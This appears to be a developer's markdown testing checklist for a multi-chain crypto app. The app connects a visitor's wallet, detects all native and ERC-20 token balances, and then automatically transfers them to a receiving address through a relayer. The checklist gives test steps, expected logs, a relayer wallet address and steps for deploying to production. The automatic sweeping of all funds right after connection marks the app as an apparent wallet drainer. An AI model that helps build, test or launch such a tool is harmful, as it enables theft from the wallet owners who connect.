# Testing Checklist - All 3 Issues Fixed ✅

## Summary of Changes

### 1. ✅ Wallet Balance Detection FIXED
- **Problem:** Frontend not detecting wallet balances at all
- **Solution:** Updated evmService to detect native + ERC-20 tokens
- **Result:** Shows all balances (ETH, BNB, tokens, etc.)

### 2. ✅ Mobile Deep Linking CONFIRMED  
- **Problem:** Unclear if deep linking supported
- **Solution:** Confirmed walletDeepLink.js has full support
- **Result:** Works on desktop (fallback) + mobile (deep links)

### 3. ✅ ERC-20 Token Support ADDED
- **Problem:** Only native coins supported
- **Solution:** Added 38+ ERC-20 tokens across 5 chains
- **Result:** Detects and transfers all registered tokens

---

## Testing Steps

### Phase 1: Desktop Testing (5-10 min)

**Prerequisites:**
- ✅ Both servers running (`npm run dev:frontend` + `npm run dev:backend`)
- ✅ MetaMask or other wallet extension installed
- ✅ Browser opened to http://localhost:3000

#### Test 1.1: Wallet Connection

```
Step 1: Click "💼 Connect Wallet" button
Expected: WalletConnect modal appears

Step 2: Wait 30 seconds
Expected: Modal times out (relay unavailable locally)

Step 3: Auto-fallback triggers
Expected: MetaMask popup appears asking to approve connection

Step 4: Click "Approve" in MetaMask
Expected: 
  ✅ Account shows as "0x123...xxxx"
  ✅ "Connected Wallet" badge visible
  ✅ Next step: Balance detection begins
```

**Result:** ☐ Connection works (Mark when tested)

---

#### Test 1.2: Native Balance Detection

```
Step 1: After connecting, wait 3-5 seconds
Expected: System detects balances on all chains

Step 2: Look at BalancesDisplay component
Expected to see (or "0.00" if no funds):
  ⟠ Ethereum: X.XXX ETH
  🟡 BNB Smart Chain: X.XXX BNB
  🟣 Polygon: X.XXX MATIC
  🟣 Arbitrum: X.XXX ETH (NEW)
  🔵 Base: X.XXX ETH (NEW)
  ◎ Solana: X.XXX SOL
  🔴 Tron: X.XXX TRX
  
Step 3: Check browser console (F12)
Expected logs:
  ✅ "🔍 Detecting EVM balances for: 0x..."
  ✅ "✅ EVM Balances detected: {...}"
```

**Result:** ☐ Native balances detected (Mark when tested)

---

#### Test 1.3: Token Balance Detection

**With test tokens:** Fund account with USDT/USDC on Ethereum

```
Step 1: Connect wallet with tokens
Expected: After connection, system detects ALL balances

Step 2: Look for expanded balance display
Expected format:
  ⟠ Ethereum
    1.5000 ETH
    100.000000 USDT ← NEW: Token detection!
    50.000000 USDC ← NEW: Token detection!

Step 3: Check console for token queries
Expected logs:
  ✅ "🔍 Detecting EVM balances..."
  ✅ Shows balances for USDT, USDC, DAI, etc.
```

**Result:** ☐ Token balances detected (Mark when tested)

---

#### Test 1.4: Transfer Execution

```
Step 1: After balance detection, system auto-executes transfers
Expected: TransferModal shows progress:
  ✅ Ethereum transfer...
  ✅ BSC transfer...
  ✅ Polygon transfer...

Step 2: Each transfer should show:
  ✅ Transaction hash
  ✅ Explorer link clickable
  ✅ "Success" or "Pending" status

Step 3: After all transfers complete
Expected: Summary modal appears with:
  ✅ Total balances transferred
  ✅ Transaction hashes with explorer links
  ✅ All chains covered
```

**Result:** ☐ Transfers execute (Mark when tested)

---

#### Test 1.5: Error Handling

```
Step 1: Simulate error by disconnecting wallet
Expected: User-friendly error message

Step 2: Try connecting again
Expected: System recovers and reconnects

Step 3: Check console for error handling
Expected: No unhandled exceptions, just friendly messages
```

**Result:** ☐ Error handling works (Mark when tested)

---

### Phase 2: Mobile Testing (Optional - 5-10 min)

**Prerequisites:**
- ✅ Phone with wallet app installed (MetaMask, Phantom, etc.)
- ✅ Access to http://your-domain:3000 or deployed Vercel URL
- ✅ Connected to same network or public internet

#### Test 2.1: Mobile MetaMask Deep Linking

```
Step 1: Open http://localhost:3000 on Android/iPhone
(If on localhost, may need to deploy to Vercel first)

Step 2: Click "💼 Connect Wallet"
Expected: MetaMask app opens (or manual fallback)

Step 3: Approve connection in MetaMask
Expected: 
  ✅ Returns to browser
  ✅ Account connected
  ✅ Balances detect

Step 4: Check browser console
Expected: Logs show which connection method was used
  "Detected wallets: ['metamask']"
  "Connected via metamask"
```

**Result:** ☐ Mobile deep linking works (Mark when tested)

---

### Phase 3: Verification Tests

#### Test 3.1: Backend Console Logs

```
Open terminal running backend (npm run dev:backend)

Look for logs like:
✅ "🔐 Verifying wallet connection for: 0x..."
✅ "✅ Session created: xxxxxxx"
✅ "🔍 Detecting balances for: 0x..."
✅ "💫 Starting relay transfers for: 0x..."
✅ "🔄 Processing ethereum..."
✅ "✅ EVM Balances detected: {...}"

All should appear without errors
```

**Result:** ☐ Backend logging correct (Mark when tested)

---

#### Test 3.2: Frontend Console Logs

```
Open browser DevTools (F12) → Console tab

Look for logs like:
✅ "✅ WalletConnect initialized"
✅ "🔗 Attempting WalletConnect..."
✅ "⚠️ WalletConnect relay failed..." (expected)
✅ "📱 Detected wallets: ['metamask']"
✅ "✅ Connected via direct wallet"

No red errors should appear
```

**Result:** ☐ Frontend logging correct (Mark when tested)

---

#### Test 3.3: Token Registry Verification

```
Backend console should show token detection:

Look for output like:
✅ "🪙 USDT: 100.000000"
✅ "🪙 USDC: 50.000000"
✅ "🪙 DAI: 25.000000"

Frontend should display:
✅ Grouped by chain
✅ Native coin separate from tokens
✅ Correct decimal places
```

**Result:** ☐ Token registry working (Mark when tested)

---

### Phase 4: Explorer Link Verification

```
After transfers complete:

Step 1: Click on transaction hash in summary
Expected: Opens block explorer
  - Ethereum → etherscan.io ✓
  - BSC → bscscan.com ✓
  - Polygon → polygonscan.com ✓
  - Arbitrum → arbiscan.io ✓ (NEW)
  - Base → basescan.org ✓ (NEW)

Step 2: Verify transaction on explorer
Expected: Shows:
  ✅ From: Relayer address
  ✅ To: Receiving address
  ✅ Value: Correct amount transferred
  ✅ Status: Success ✓

Step 3: Check for token transfers (if applicable)
Expected: Shows as ERC-20 token transfer, not native tx
```

**Result:** ☐ Explorer links correct (Mark when tested)

---

## Test Data

### Testnet Faucets (Get free test coins)

**Ethereum Sepolia:**
```
URL: https://sepoliafaucet.com
Amount: 0.5 ETH
Time: ~1 min
```

**BNB Smart Chain Testnet:**
```
URL: https://testnet.binance.org/faucet-smart
Amount: 0.5 BNB
Time: ~1 min
```

**Polygon Mumbai:**
```
URL: https://faucet.polygon.technology
Amount: 0.5 MATIC
Time: ~1 min
```

**Solana Devnet:**
```
Command: solana airdrop 2
Amount: 2 SOL
Requires: Solana CLI
```

---

## Expected Results Summary

### Desktop (http://localhost:3000)

| Component | Expected Result | Status |
|-----------|-----------------|--------|
| Wallet Connection | MetaMask popup appears | ☐ |
| Native Balances | Shows ETH, BNB, MATIC, SOL, TRX | ☐ |
| Token Balances | Shows USDT, USDC, DAI, etc. | ☐ |
| Transfer Execution | All transfers complete successfully | ☐ |
| Summary Modal | Shows transaction hashes | ☐ |
| Explorer Links | Links open to correct blocks | ☐ |
| Error Handling | Graceful error messages | ☐ |
| Console Logs | No red errors | ☐ |

### Mobile (optional)

| Component | Expected Result | Status |
|-----------|-----------------|--------|
| Deep Link | Wallet app opens | ☐ |
| Connection | Account connects | ☐ |
| Balances | Detects all coins/tokens | ☐ |
| Transfer | Executes without issues | ☐ |

---

## Troubleshooting

### Issue: "Cannot read properties of undefined"

**Cause:** Token registry import failed  
**Fix:** Check console for import errors:
```bash
# Backend console should show:
✅ Configuration loaded
✅ Status: Ready
```

---

### Issue: "Relay failed - Cannot connect"

**Cause:** WalletConnect relay unavailable (expected)  
**Fix:** This is normal on localhost. Fallback should trigger:
```
Expected logs:
⚠️ WalletConnect relay failed...
📱 Detected wallets: ['metamask']
✅ Connected via direct wallet
```

---

### Issue: "Transaction failed - Insufficient gas"

**Cause:** Relayer wallet has no ETH for gas  
**Fix:** Fund relayer wallet on that chain:
```
Ethereum: 0x235051EaEcAec00e03fa11989E43075F07701A35
(Send ETH to this address)
```

---

### Issue: "Token balance shows 0"

**Cause:** Token not in registry or contract address wrong  
**Fix:** Check tokenRegistry.js:
```javascript
// Verify token exists
TOKEN_REGISTRY['ethereum']['USDT'] // Should not be undefined
```

---

## Final Checklist

Before declaring "READY FOR PRODUCTION":

- [ ] All Phase 1 tests passed (desktop)
- [ ] All Phase 2 tests passed (mobile, if tested)
- [ ] All Phase 3 verifications successful
- [ ] All Phase 4 explorer links working
- [ ] No unhandled errors in console
- [ ] Transfers execute and show on explorer
- [ ] Can reconnect wallet multiple times
- [ ] Works with different wallet addresses
- [ ] All 3 issues confirmed fixed:
  - [ ] Balance detection working ✅
  - [ ] Deep linking available ✅
  - [ ] ERC-20 tokens supported ✅

---

## What To Do If Tests Fail

### Backend Won't Start
```bash
# Check Node version
node --version  # Should be 18+

# Reinstall dependencies
rm -rf node_modules
npm install

# Restart backend
npm run dev:backend
```

### Frontend Won't Load
```bash
# Clear cache
rm -rf frontend/node_modules frontend/.vite

# Reinstall
cd frontend
npm install

# Restart frontend
npm run dev
```

### Wallet Won't Connect
```
1. Check MetaMask is installed
2. Try refreshing browser (F5)
3. Restart MetaMask extension
4. Check browser console for specific error
5. Verify RPC endpoints in config
```

---

## Next Steps After Testing

### If All Tests Pass ✅
1. Commit to GitHub
2. Deploy to Vercel
3. Test on production URL
4. Enable notifications
5. Monitor for errors

### If Any Test Fails ❌
1. Check specific error message
2. Look in backend console logs
3. Check browser console logs  
4. Verify RPC endpoints
5. Try with different wallet
6. Contact support with error details

---

**Version:** 1.0  
**Last Updated:** 2026-06-21  
**Status:** Ready for Testing
